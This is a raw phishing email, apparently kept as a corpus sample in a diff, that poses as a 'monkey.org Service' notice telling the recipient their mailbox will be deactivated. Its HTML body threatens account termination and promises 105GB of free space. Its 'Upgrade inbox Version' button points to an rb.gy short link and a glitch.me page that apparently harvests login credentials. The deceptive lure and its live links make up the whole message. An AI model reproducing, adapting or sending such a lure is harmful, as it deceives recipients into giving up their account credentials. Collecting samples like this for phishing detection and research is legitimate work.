@@ -1,0 +1,332 @@
+From jose@monkey.org Mon Nov 13 14:55:30 2023 +0000
+Return-Path: infonet@fvtransports.com
+Delivered-To: jose@monkey.org
+X-FDA: 81453229620.40.8FF91B7
+Received: from fvtransports.com (fvtransports.com [198.46.232.140])
+	by imf27.b.hostedemail.com (Postfix) with ESMTP id ABA591A0007
+	for <jose@monkey.org>; Mon, 13 Nov 2023 14:55:28 +0000 (UTC)
+Authentication-Results: imf27.b.hostedemail.com;
+	dkim=pass header.d=fvtransports.com header.s=default header.b=It9vcLBL;
+	dmarc=pass (policy=quarantine) header.from=fvtransports.com;
+	spf=pass (imf27.b.hostedemail.com: domain of infonet@fvtransports.com designates 198.46.232.140 as permitted sender) smtp.mailfrom=infonet@fvtransports.com
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=hostedemail.com;
+	s=arc-20220608; t=1699887328;
+	h=from:from:sender:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:
+	 content-transfer-encoding:content-transfer-encoding:in-reply-to:
+	 references:dkim-signature; bh=waprvbr4mH5xYu5EuOh1leM8u5bdWrdVqLV5cQelprM=;
+	b=2F248VHyJ4cjJLbiFcF9eYFYo4B1+o3l23qEBlhrWKycvq1hXjFvZix/DXVXv88wPtgnrF
+	R6yy7MtCLSL8Br2afsxmETNGM1yldjZGFRqtASBfzZ11+phAOYB5s6mquoddYdcBwAmee5
+	asQ1Vt5ppoSevLKXFqc6kw9qbzmt5JI=
+ARC-Authentication-Results: i=1;
+	imf27.b.hostedemail.com;
+	dkim=pass header.d=fvtransports.com header.s=default header.b=It9vcLBL;
+	dmarc=pass (policy=quarantine) header.from=fvtransports.com;
+	spf=pass (imf27.b.hostedemail.com: domain of infonet@fvtransports.com designates 198.46.232.140 as permitted sender) smtp.mailfrom=infonet@fvtransports.com
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1699887328; a=rsa-sha256;
+	cv=none;
+	b=L1ICt91pG50snmLC4oGtrOjK5lQjDZxUJL6t8+2ROvkPCUZOqzYYPJCgODihs4Fbd+P74V
+	4PxabGQ34GCy8mZkyYxqerqv+wqRMAImp6xuIJf7XPxE4X71S6CC9S7uaGYnT1fdWRBK9p
+	hIe5YS0cMpV1ivqu7K0HHyhGuVpVqIQ=
+Received: from fvtransports.com (unknown [198.55.110.71])
+	by fvtransports.com (Postfix) with ESMTPSA id 2DD4921E16
+	for <jose@monkey.org>; Mon, 13 Nov 2023 09:50:57 -0500 (EST)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=fvtransports.com;
+	s=default; t=1699887057;
+	h=from:from:reply-to:subject:subject:date:date:message-id:message-id:
+	 to:to:cc:mime-version:mime-version:content-type:content-type:
+	 content-transfer-encoding:content-transfer-encoding;
+	bh=waprvbr4mH5xYu5EuOh1leM8u5bdWrdVqLV5cQelprM=;
+	b=It9vcLBLhdQPfDmnoCK3Ks2SXe2sviRe4LEeEyW/F7yUlZeqHe7AiTLPujk9P7kbLKoZ+1
+	3tYSC73NxoZ9IR5Wq6unFbc4+fBzMWMRWpX0obAq43GOhQiT5Gj/fGy+1BHEak3CiUI2RV
+	BgM6azOYLRWUXGE9hWELd1yreI07kvA=
+From: monkey.org Service <infonet@fvtransports.com>
+To: jose@monkey.org
+Subject: jose@monkey.org Deactivation Request.
+Date: 13 Nov 2023 06:50:59 -0800
+Message-ID: <20231113065059.622EF3AB72175026@fvtransports.com>
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+X-Rspamd-Queue-Id: ABA591A0007
+X-Stat-Signature: 7zbd6tznmoxtk8sxqnte7p3zfqzjam1u
+X-Rspam-User: 
+X-Spam-Status: No, score=5.40
+X-Rspamd-Server: rspam07
+X-HE-Tag: 1699887328-130331
+X-HE-Meta: U2FsdGVkX19ih0qnd1BldCtFcVlka3KDfzAwIVKKjBP7HW3uOC5aEGNxoTvjOr4C4sKCX+R03yI2YThqqlEmT63hbLBFfJqpHXYbjd3rk0dps8oTV/PVpvTEwjtX5mdoq2yKIuVafUZ7ExzSL/wMXrgNosp6fB819GdVcGcrTK8MkGAWa6K1Eh7eTgGhdd0Y8MIJIAb5Y+iCNnSPz1OXJxAzxEeJ44GR5kCxJLQELjU=
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 368
+
+<HTML><HEAD>
+<META name=3DGENERATOR content=3D"MSHTML 11.00.9600.17416"></HEAD>
+<body>
+<H3 style=3D"BOX-SIZING: border-box; FONT-SIZE: 1.25em; FONT-FAMILY: Arial,=
+ sans-serif; BORDER-TOP-COLOR: rgb(238,238,238); WHITE-SPACE: normal; WORD-=
+SPACING: 0px; TEXT-TRANSFORM: none; BORDER-LEFT-COLOR: rgb(238,238,238); CO=
+LOR: rgb(0,0,0); FONT-STYLE: normal; BORDER-BOTTOM-COLOR: rgb(238,238,238);=
+ ORPHANS: 2; WIDOWS: 2; MARGIN-TOP: 0px; BORDER-RIGHT-COLOR: rgb(238,238,23=
+8); LETTER-SPACING: normal; LINE-HEIGHT: normal; BACKGROUND-COLOR: rgb(255,=
+255,255); TEXT-INDENT: 0px; font-variant-ligatures:=20
+normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-dec=
+oration-thickness: initial; text-decoration-style: initial; text-decoration=
+-color: initial"><SPAN style=3D"BOX-SIZING: border-box; BORDER-TOP-COLOR: r=
+gb(238,238,238); BORDER-LEFT-COLOR: rgb(238,238,238); FONT-WEIGHT: bolder; =
+BORDER-BOTTOM-COLOR: rgb(238,238,238); BORDER-RIGHT-COLOR: rgb(238,238,238)=
+; LINE-HEIGHT: normal">
+<SPAN style=3D"BOX-SIZING: border-box; BORDER-TOP-COLOR: rgb(238,238,238); =
+BORDER-LEFT-COLOR: rgb(238,238,238); COLOR: rgb(102,102,102); BORDER-BOTTOM=
+-COLOR: rgb(238,238,238); BORDER-RIGHT-COLOR: rgb(238,238,238); LINE-HEIGHT=
+: normal"><SPAN style=3D"BOX-SIZING: border-box; BORDER-TOP-COLOR: rgb(238,=
+238,238); VERTICAL-ALIGN: inherit; BORDER-LEFT-COLOR: rgb(238,238,238); BOR=
+DER-BOTTOM-COLOR: rgb(238,238,238); BORDER-RIGHT-COLOR: rgb(238,238,238); L=
+INE-HEIGHT: normal">
+<SPAN style=3D"BOX-SIZING: border-box; BORDER-TOP-COLOR: rgb(238,238,238); =
+VERTICAL-ALIGN: inherit; BORDER-LEFT-COLOR: rgb(238,238,238); BORDER-BOTTOM=
+-COLOR: rgb(238,238,238); BORDER-RIGHT-COLOR: rgb(238,238,238); LINE-HEIGHT=
+: normal"><SPAN style=3D'BOX-SIZING: border-box; FONT-FAMILY: "Agency FB"; =
+BORDER-TOP-COLOR: rgb(238,238,238); BORDER-LEFT-COLOR: rgb(238,238,238); BO=
+RDER-BOTTOM-COLOR: rgb(238,238,238); BORDER-RIGHT-COLOR: rgb(238,238,238); =
+LINE-HEIGHT: normal'>Dear&nbsp;user,</SPAN></SPAN>
+</SPAN></SPAN></SPAN></H3>
+<P style=3D'BOX-SIZING: border-box; FONT-SIZE: small; FONT-FAMILY: -apple-s=
+ystem, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen-Sans, Ubuntu, Cantare=
+ll, "Helvetica Neue", sans-serif; BORDER-TOP-COLOR: rgb(238,238,238); WHITE=
+-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; BORDER-LEFT-COLOR:=
+ rgb(238,238,238); FONT-WEIGHT: 400; COLOR: rgb(34,34,34); FONT-STYLE: norm=
+al; BORDER-BOTTOM-COLOR: rgb(238,238,238); MARGIN: 1em 0px; ORPHANS: 2; WID=
+OWS: 2; BORDER-RIGHT-COLOR: rgb(238,238,238);=20
+LETTER-SPACING: normal; LINE-HEIGHT: normal; BACKGROUND-COLOR: rgb(255,255,=
+255); TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant-caps: =
+normal; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial;=
+ text-decoration-style: initial; text-decoration-color: initial'><FONT colo=
+r=3D#000000>
+<SPAN style=3D"BOX-SIZING: border-box; FONT-SIZE: 12px; FONT-FAMILY: Arial,=
+ sans-serif; BORDER-TOP-COLOR: rgb(238,238,238); BORDER-LEFT-COLOR: rgb(238=
+,238,238); BORDER-BOTTOM-COLOR: rgb(238,238,238); BORDER-RIGHT-COLOR: rgb(2=
+38,238,238); LINE-HEIGHT: normal">We are&nbsp;closing every old version&nbs=
+p;</SPAN></FONT>
+<SPAN style=3D"BOX-SIZING: border-box; FONT-SIZE: 12px; FONT-FAMILY: Arial,=
+ sans-serif; BORDER-TOP-COLOR: rgb(238,238,238); BORDER-LEFT-COLOR: rgb(238=
+,238,238); COLOR: rgb(0,0,0); BORDER-BOTTOM-COLOR: rgb(238,238,238); BORDER=
+-RIGHT-COLOR: rgb(238,238,238); LINE-HEIGHT: normal">of&nbsp;</SPAN>
+<SPAN style=3D"BOX-SIZING: border-box; FONT-SIZE: 12px; FONT-FAMILY: Arial,=
+ sans-serif; BORDER-TOP-COLOR: rgb(238,238,238); BORDER-LEFT-COLOR: rgb(238=
+,238,238); COLOR: rgb(0,0,0); BORDER-BOTTOM-COLOR: rgb(238,238,238); BORDER=
+-RIGHT-COLOR: rgb(238,238,238); LINE-HEIGHT: normal">monkey.org mailbox</SP=
+AN>
+<SPAN style=3D"BOX-SIZING: border-box; FONT-SIZE: 12px; FONT-FAMILY: Arial,=
+ sans-serif; BORDER-TOP-COLOR: rgb(238,238,238); BORDER-LEFT-COLOR: rgb(238=
+,238,238); COLOR: rgb(0,0,0); BORDER-BOTTOM-COLOR: rgb(238,238,238); BORDER=
+-RIGHT-COLOR: rgb(238,238,238); LINE-HEIGHT: normal">.<BR></SPAN>
+<BR style=3D"BOX-SIZING: border-box; FONT-SIZE: 12px; FONT-FAMILY: Arial, s=
+ans-serif; BORDER-TOP-COLOR: rgb(238,238,238); BORDER-LEFT-COLOR: rgb(238,2=
+38,238); BORDER-BOTTOM-COLOR: rgb(238,238,238); BORDER-RIGHT-COLOR: rgb(238=
+,238,238); LINE-HEIGHT: normal"><SPAN style=3D"BOX-SIZING: border-box; FONT=
+-FAMILY: Arial, sans-serif; BORDER-TOP-COLOR: rgb(238,238,238); BORDER-LEFT=
+-COLOR: rgb(238,238,238); BORDER-BOTTOM-COLOR: rgb(238,238,238); BORDER-RIG=
+HT-COLOR: rgb(238,238,238); LINE-HEIGHT: normal">
+<FONT color=3D#000000>Your email</FONT></SPAN><SPAN style=3D"BOX-SIZING: bo=
+rder-box; FONT-FAMILY: Arial, sans-serif; BORDER-TOP-COLOR: rgb(238,238,238=
+); BORDER-LEFT-COLOR: rgb(238,238,238); COLOR: rgb(68,68,68); BORDER-BOTTOM=
+-COLOR: rgb(238,238,238); BORDER-RIGHT-COLOR: rgb(238,238,238); LINE-HEIGHT=
+: normal">&nbsp;</SPAN>
+<SPAN style=3D"BOX-SIZING: border-box; FONT-FAMILY: Arial, sans-serif; BORD=
+ER-TOP-COLOR: rgb(238,238,238); BORDER-LEFT-COLOR: rgb(238,238,238); FONT-W=
+EIGHT: bold; BORDER-BOTTOM-COLOR: rgb(238,238,238); BORDER-RIGHT-COLOR: rgb=
+(238,238,238); LINE-HEIGHT: normal"><SPAN style=3D"BOX-SIZING: border-box; =
+BORDER-TOP-COLOR: rgb(238,238,238); VERTICAL-ALIGN: inherit; BORDER-LEFT-CO=
+LOR: rgb(238,238,238); BORDER-BOTTOM-COLOR: rgb(238,238,238); BORDER-RIGHT-=
+COLOR: rgb(238,238,238); LINE-HEIGHT: normal">
+<SPAN style=3D"BOX-SIZING: border-box; BORDER-TOP-COLOR: rgb(238,238,238); =
+VERTICAL-ALIGN: inherit; BORDER-LEFT-COLOR: rgb(238,238,238); BORDER-BOTTOM=
+-COLOR: rgb(238,238,238); BORDER-RIGHT-COLOR: rgb(238,238,238); LINE-HEIGHT=
+: normal"><FONT color=3D#444444>(</FONT></SPAN></SPAN></SPAN>
+<SPAN style=3D"BOX-SIZING: border-box; FONT-FAMILY: Arial, sans-serif; BORD=
+ER-TOP-COLOR: rgb(238,238,238); BORDER-LEFT-COLOR: rgb(238,238,238); FONT-W=
+EIGHT: bold; BORDER-BOTTOM-COLOR: rgb(238,238,238); BORDER-RIGHT-COLOR: rgb=
+(238,238,238); LINE-HEIGHT: normal"><SPAN style=3D"BOX-SIZING: border-box; =
+BORDER-TOP-COLOR: rgb(238,238,238); VERTICAL-ALIGN: inherit; BORDER-LEFT-CO=
+LOR: rgb(238,238,238); BORDER-BOTTOM-COLOR: rgb(238,238,238); BORDER-RIGHT-=
+COLOR: rgb(238,238,238); LINE-HEIGHT: normal">
+<SPAN style=3D"BOX-SIZING: border-box; BORDER-TOP-COLOR: rgb(238,238,238); =
+VERTICAL-ALIGN: inherit; BORDER-LEFT-COLOR: rgb(238,238,238); BORDER-BOTTOM=
+-COLOR: rgb(238,238,238); BORDER-RIGHT-COLOR: rgb(238,238,238); LINE-HEIGHT=
+: normal"><FONT color=3D#000000><SPAN style=3D'FONT-FAMILY: wf_segoe-ui_nor=
+mal, "Segoe UI", "Segoe WP", Tahoma, Arial, sans-serif, serif, EmojiFont; F=
+ONT-WEIGHT: 400; TEXT-ALIGN: center'>jose@monkey.org</SPAN></FONT></SPAN></=
+SPAN></SPAN>
+<SPAN style=3D"BOX-SIZING: border-box; FONT-FAMILY: Arial, sans-serif; BORD=
+ER-TOP-COLOR: rgb(238,238,238); VERTICAL-ALIGN: inherit; BORDER-LEFT-COLOR:=
+ rgb(238,238,238); FONT-WEIGHT: 700; COLOR: rgb(68,68,68); BORDER-BOTTOM-CO=
+LOR: rgb(238,238,238); BORDER-RIGHT-COLOR: rgb(238,238,238); LINE-HEIGHT: n=
+ormal">
+<SPAN style=3D"BOX-SIZING: border-box; BORDER-TOP-COLOR: rgb(238,238,238); =
+VERTICAL-ALIGN: inherit; BORDER-LEFT-COLOR: rgb(238,238,238); BORDER-BOTTOM=
+-COLOR: rgb(238,238,238); BORDER-RIGHT-COLOR: rgb(238,238,238); LINE-HEIGHT=
+: normal">)</SPAN></SPAN><FONT style=3D"FONT-FAMILY: Arial, sans-serif; FON=
+T-WEIGHT: 700" color=3D#444444>&nbsp;</FONT>
+<SPAN style=3D"BOX-SIZING: border-box; FONT-FAMILY: Arial, sans-serif; BORD=
+ER-TOP-COLOR: rgb(238,238,238); BORDER-LEFT-COLOR: rgb(238,238,238); BORDER=
+-BOTTOM-COLOR: rgb(238,238,238); BORDER-RIGHT-COLOR: rgb(238,238,238); LINE=
+-HEIGHT: normal"><FONT color=3D#000000>was listed on the old version.Please=
+ tap the blue button</FONT><FONT color=3D#444444><SPAN>&nbsp;</SPAN></FONT>=
+<FONT color=3D#000000>below to upgrade to the latest version and get</FONT>=
+<FONT color=3D#444444><SPAN>&nbsp;</SPAN></FONT>
+<FONT color=3D#ff0000>105GB</FONT><FONT color=3D#444444><SPAN>&nbsp;</SPAN>=
+</FONT><FONT color=3D#000000>Free Space.</FONT></SPAN></P>
+<P style=3D'BOX-SIZING: border-box; FONT-SIZE: small; FONT-FAMILY: -apple-s=
+ystem, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen-Sans, Ubuntu, Cantare=
+ll, "Helvetica Neue", sans-serif; BORDER-TOP-COLOR: rgb(238,238,238); WHITE=
+-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; BORDER-LEFT-COLOR:=
+ rgb(238,238,238); FONT-WEIGHT: 400; COLOR: rgb(34,34,34); FONT-STYLE: norm=
+al; BORDER-BOTTOM-COLOR: rgb(238,238,238); MARGIN: 1em 0px; ORPHANS: 2; WID=
+OWS: 2; BORDER-RIGHT-COLOR: rgb(238,238,238);=20
+LETTER-SPACING: normal; LINE-HEIGHT: normal; BACKGROUND-COLOR: rgb(255,255,=
+255); TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant-caps: =
+normal; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial;=
+ text-decoration-style: initial; text-decoration-color: initial'>
+<BR style=3D"BOX-SIZING: border-box; FONT-SIZE: 12px; FONT-FAMILY: Arial, s=
+ans-serif; BORDER-TOP-COLOR: rgb(238,238,238); BORDER-LEFT-COLOR: rgb(238,2=
+38,238); BORDER-BOTTOM-COLOR: rgb(238,238,238); BORDER-RIGHT-COLOR: rgb(238=
+,238,238); LINE-HEIGHT: normal">
+<SPAN style=3D"BOX-SIZING: border-box; FONT-FAMILY: Arial, sans-serif; BORD=
+ER-TOP-COLOR: rgb(238,238,238); BORDER-LEFT-COLOR: rgb(238,238,238); FONT-W=
+EIGHT: bold; COLOR: rgb(0,0,0); BORDER-BOTTOM-COLOR: rgb(238,238,238); BORD=
+ER-RIGHT-COLOR: rgb(238,238,238); LINE-HEIGHT: normal">
+<SPAN style=3D"BOX-SIZING: border-box; FONT-SIZE: 12px; BORDER-TOP-COLOR: r=
+gb(238,238,238); BORDER-LEFT-COLOR: rgb(238,238,238); BORDER-BOTTOM-COLOR: =
+rgb(238,238,238); BORDER-RIGHT-COLOR: rgb(238,238,238); LINE-HEIGHT: normal=
+"><SPAN style=3D"BOX-SIZING: border-box; BORDER-TOP-COLOR: rgb(238,238,238)=
+; VERTICAL-ALIGN: inherit; BORDER-LEFT-COLOR: rgb(238,238,238); BORDER-BOTT=
+OM-COLOR: rgb(238,238,238); BORDER-RIGHT-COLOR: rgb(238,238,238); LINE-HEIG=
+HT: normal">
+<SPAN style=3D"BOX-SIZING: border-box; BORDER-TOP-COLOR: rgb(238,238,238); =
+VERTICAL-ALIGN: inherit; BORDER-LEFT-COLOR: rgb(238,238,238); BORDER-BOTTOM=
+-COLOR: rgb(238,238,238); BORDER-RIGHT-COLOR: rgb(238,238,238); LINE-HEIGHT=
+: normal">NOTE</SPAN></SPAN></SPAN><SPAN style=3D"BOX-SIZING: border-box; B=
+ORDER-TOP-COLOR: rgb(238,238,238); BORDER-LEFT-COLOR: rgb(238,238,238); COL=
+OR: rgb(102,102,102); BORDER-BOTTOM-COLOR: rgb(238,238,238); BORDER-RIGHT-C=
+OLOR: rgb(238,238,238); LINE-HEIGHT: normal">
+<SPAN style=3D"BOX-SIZING: border-box; BORDER-TOP-COLOR: rgb(238,238,238); =
+VERTICAL-ALIGN: inherit; BORDER-LEFT-COLOR: rgb(238,238,238); BORDER-BOTTOM=
+-COLOR: rgb(238,238,238); BORDER-RIGHT-COLOR: rgb(238,238,238); LINE-HEIGHT=
+: normal"><SPAN style=3D"FONT-SIZE: 12px">&nbsp;</SPAN>
+<SPAN style=3D"BOX-SIZING: border-box; BORDER-TOP-COLOR: rgb(238,238,238); =
+VERTICAL-ALIGN: inherit; BORDER-LEFT-COLOR: rgb(238,238,238); BORDER-BOTTOM=
+-COLOR: rgb(238,238,238); BORDER-RIGHT-COLOR: rgb(238,238,238); LINE-HEIGHT=
+: normal">:</SPAN></SPAN></SPAN><SPAN style=3D"FONT-SIZE: 12px">&nbsp;</SPA=
+N></SPAN>
+<SPAN style=3D"BOX-SIZING: border-box; FONT-SIZE: 12px; FONT-FAMILY: Arial,=
+ sans-serif; BORDER-TOP-COLOR: rgb(238,238,238); BORDER-LEFT-COLOR: rgb(238=
+,238,238); BORDER-BOTTOM-COLOR: rgb(238,238,238); BORDER-RIGHT-COLOR: rgb(2=
+38,238,238); LINE-HEIGHT: normal"><FONT color=3D#000000>Failure to do this =
+would lead to account termination</FONT></SPAN></P>
+<P style=3D'BOX-SIZING: border-box; FONT-SIZE: small; FONT-FAMILY: -apple-s=
+ystem, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen-Sans, Ubuntu, Cantare=
+ll, "Helvetica Neue", sans-serif; BORDER-TOP-COLOR: rgb(238,238,238); WHITE=
+-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; BORDER-LEFT-COLOR:=
+ rgb(238,238,238); FONT-WEIGHT: 400; COLOR: rgb(34,34,34); FONT-STYLE: norm=
+al; BORDER-BOTTOM-COLOR: rgb(238,238,238); MARGIN: 1em 0px; ORPHANS: 2; WID=
+OWS: 2; BORDER-RIGHT-COLOR: rgb(238,238,238);=20
+LETTER-SPACING: normal; LINE-HEIGHT: normal; BACKGROUND-COLOR: rgb(255,255,=
+255); TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant-caps: =
+normal; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial;=
+ text-decoration-style: initial; text-decoration-color: initial'><SPAN styl=
+e=3D"FONT-FAMILY: Arial, sans-serif; COLOR: rgb(34,34,34)"><FONT style=3D"F=
+ONT-SIZE: 12px" color=3D#666666>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<SPAN>&nb=
+sp;</SPAN></FONT><FONT color=3D#666666>&nbsp;</FONT>
+</SPAN><SPAN style=3D"FONT-FAMILY: Arial, sans-serif"><FONT color=3D#000000=
+>:</FONT></SPAN><SPAN style=3D"FONT-SIZE: 12px; FONT-FAMILY: Arial, sans-se=
+rif"><FONT color=3D#000000>&nbsp;Follow&nbsp; below to upgrade and keep acc=
+ount active</FONT></SPAN></P>
+<P style=3D'BOX-SIZING: border-box; FONT-SIZE: small; FONT-FAMILY: -apple-s=
+ystem, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen-Sans, Ubuntu, Cantare=
+ll, "Helvetica Neue", sans-serif; BORDER-TOP-COLOR: rgb(238,238,238); WHITE=
+-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; BORDER-LEFT-COLOR:=
+ rgb(238,238,238); FONT-WEIGHT: 400; COLOR: rgb(0,0,0); FONT-STYLE: normal;=
+ BORDER-BOTTOM-COLOR: rgb(238,238,238); MARGIN: 1em 0px; ORPHANS: 2; WIDOWS=
+: 2; BORDER-RIGHT-COLOR: rgb(238,238,238);=20
+LETTER-SPACING: normal; LINE-HEIGHT: normal; BACKGROUND-COLOR: rgb(255,255,=
+255); TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant-caps: =
+normal; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial;=
+ text-decoration-style: initial; text-decoration-color: initial'><SPAN styl=
+e=3D"FONT-SIZE: 12px; FONT-FAMILY: Arial, sans-serif"><BR></SPAN></P>
+<P style=3D"BOX-SIZING: border-box; FONT-SIZE: 15px; FONT-FAMILY: Arial, sa=
+ns-serif; BORDER-TOP-COLOR: rgb(238,238,238); WHITE-SPACE: normal; WORD-SPA=
+CING: 0px; TEXT-TRANSFORM: none; BORDER-LEFT-COLOR: rgb(238,238,238); FONT-=
+WEIGHT: 400; COLOR: rgb(0,0,0); FONT-STYLE: normal; BORDER-BOTTOM-COLOR: rg=
+b(238,238,238); MARGIN: 6px 0px; ORPHANS: 2; WIDOWS: 2; BORDER-RIGHT-COLOR:=
+ rgb(238,238,238); LETTER-SPACING: normal; LINE-HEIGHT: normal; BACKGROUND-=
+COLOR: rgb(255,255,255); TEXT-INDENT: 0px;=20
+font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-str=
+oke-width: 0px; text-decoration-thickness: initial; text-decoration-style: =
+initial; text-decoration-color: initial">
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp=
+; &nbsp; &nbsp;&nbsp;<A title=3D"Listen and Review" style=3D"BORDER-LEFT-WI=
+DTH: 0px; BOX-SIZING: border-box; BORDER-RIGHT-WIDTH: 0px; BORDER-TOP-COLOR=
+: rgb(238,238,238); VERTICAL-ALIGN: baseline; BACKGROUND: rgb(0,120,215) 0%=
+ 50%; BORDER-BOTTOM-WIDTH: 0px; BORDER-LEFT-COLOR: rgb(238,238,238); COLOR:=
+ white; PADDING-BOTTOM: 10px; BORDER-BOTTOM-COLOR: rgb(238,238,238); PADDIN=
+G-TOP: 10px; PADDING-LEFT: 40px; MARGIN: 0px;=20
+BORDER-RIGHT-COLOR: rgb(238,238,238); LINE-HEIGHT: normal; PADDING-RIGHT: 4=
+0px; BORDER-TOP-WIDTH: 0px; text-decoration-line: none" href=3D"https://rb.=
+gy/5nq110#YW05elpVQnRiMjVyWlhrdWIzSm4=3D" rel=3Dnoreferrer target=3D_blank =
+data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttps://four-candy-s=
+and.glitch.me/?emailid%3D%5B%5B-Email-%5D%5D&amp;source=3Dgmail&amp;ust=3D1=
+699350860528000&amp;usg=3DAOvVaw0zg2qGgxBFoPTuu5EtI3Ms">
+<SPAN style=3D"BOX-SIZING: border-box; BORDER-TOP-COLOR: rgb(238,238,238); =
+VERTICAL-ALIGN: inherit; BORDER-LEFT-COLOR: rgb(238,238,238); BORDER-BOTTOM=
+-COLOR: rgb(238,238,238); BORDER-RIGHT-COLOR: rgb(238,238,238); LINE-HEIGHT=
+: normal">Upgrade inbox Version&nbsp;</SPAN></A></P>
+<P style=3D"BOX-SIZING: border-box; FONT-SIZE: small; FONT-FAMILY: Arial, H=
+elvetica, sans-serif; BORDER-TOP-COLOR: rgb(238,238,238); WHITE-SPACE: norm=
+al; WORD-SPACING: 0px; TEXT-TRANSFORM: none; BORDER-LEFT-COLOR: rgb(238,238=
+,238); FONT-WEIGHT: 400; COLOR: rgb(34,34,34); FONT-STYLE: normal; BORDER-B=
+OTTOM-COLOR: rgb(238,238,238); MARGIN: 0in 0in 0pt; ORPHANS: 2; WIDOWS: 2; =
+BORDER-RIGHT-COLOR: rgb(238,238,238); LETTER-SPACING: normal; LINE-HEIGHT: =
+normal; BACKGROUND-COLOR: rgb(255,255,255);=20
+TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant-caps: normal=
+; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-=
+decoration-style: initial; text-decoration-color: initial"><BR style=3D"BOX=
+-SIZING: border-box; BORDER-TOP-COLOR: rgb(238,238,238); BORDER-LEFT-COLOR:=
+ rgb(238,238,238); BORDER-BOTTOM-COLOR: rgb(238,238,238); BORDER-RIGHT-COLO=
+R: rgb(238,238,238); LINE-HEIGHT: normal">
+<BR style=3D"BOX-SIZING: border-box; BORDER-TOP-COLOR: rgb(238,238,238); BO=
+RDER-LEFT-COLOR: rgb(238,238,238); BORDER-BOTTOM-COLOR: rgb(238,238,238); B=
+ORDER-RIGHT-COLOR: rgb(238,238,238); LINE-HEIGHT: normal"><SPAN style=3D"BO=
+X-SIZING: border-box; BORDER-TOP-COLOR: rgb(238,238,238); BORDER-LEFT-COLOR=
+: rgb(238,238,238); FONT-WEIGHT: bolder; BORDER-BOTTOM-COLOR: rgb(238,238,2=
+38); BORDER-RIGHT-COLOR: rgb(238,238,238); LINE-HEIGHT: normal">
+<SPAN style=3D"BOX-SIZING: border-box; FONT-SIZE: 12px; FONT-FAMILY: Arial,=
+ sans-serif; BORDER-TOP-COLOR: rgb(238,238,238); VERTICAL-ALIGN: inherit; B=
+ORDER-LEFT-COLOR: rgb(238,238,238); COLOR: rgb(0,0,0); BORDER-BOTTOM-COLOR:=
+ rgb(238,238,238); BORDER-RIGHT-COLOR: rgb(238,238,238); LINE-HEIGHT: norma=
+l">
+<SPAN style=3D"BOX-SIZING: border-box; BORDER-TOP-COLOR: rgb(238,238,238); =
+VERTICAL-ALIGN: inherit; BORDER-LEFT-COLOR: rgb(238,238,238); BORDER-BOTTOM=
+-COLOR: rgb(238,238,238); BORDER-RIGHT-COLOR: rgb(238,238,238); LINE-HEIGHT=
+: normal">&nbsp;Connected to&nbsp;Mail-Portal&nbsp;</SPAN></SPAN></SPAN></P=
+>
+<P style=3D"BOX-SIZING: border-box; FONT-SIZE: small; FONT-FAMILY: Arial, H=
+elvetica, sans-serif; BORDER-TOP-COLOR: rgb(238,238,238); WHITE-SPACE: norm=
+al; WORD-SPACING: 0px; TEXT-TRANSFORM: none; BORDER-LEFT-COLOR: rgb(238,238=
+,238); FONT-WEIGHT: 400; COLOR: rgb(34,34,34); FONT-STYLE: normal; BORDER-B=
+OTTOM-COLOR: rgb(238,238,238); MARGIN: 0in 0in 0pt; ORPHANS: 2; WIDOWS: 2; =
+BORDER-RIGHT-COLOR: rgb(238,238,238); LETTER-SPACING: normal; LINE-HEIGHT: =
+normal; BACKGROUND-COLOR: rgb(255,255,255);=20
+TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant-caps: normal=
+; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-=
+decoration-style: initial; text-decoration-color: initial"><SPAN style=3D"F=
+ONT-SIZE: 12px; FONT-FAMILY: Arial, sans-serif; FONT-WEIGHT: bolder; COLOR:=
+ rgb(0,0,0); TEXT-ALIGN: center">&copy; 2023&nbsp;</SPAN><SPAN style=3D"FON=
+T-SIZE: 12px; FONT-FAMILY: Arial, sans-serif; FONT-WEIGHT: 700; COLOR: rgb(=
+0,0,0)">Corporation</SPAN>
+<SPAN style=3D"FONT-SIZE: 12px; FONT-FAMILY: Arial, sans-serif; FONT-WEIGHT=
+: bolder; COLOR: rgb(0,0,0); TEXT-ALIGN: center">.</SPAN><SPAN style=3D"FON=
+T-SIZE: 12px; FONT-FAMILY: Arial, sans-serif; FONT-WEIGHT: 700; COLOR: rgb(=
+0,0,0)">All rights reserved.</SPAN></P></BODY></HTML>
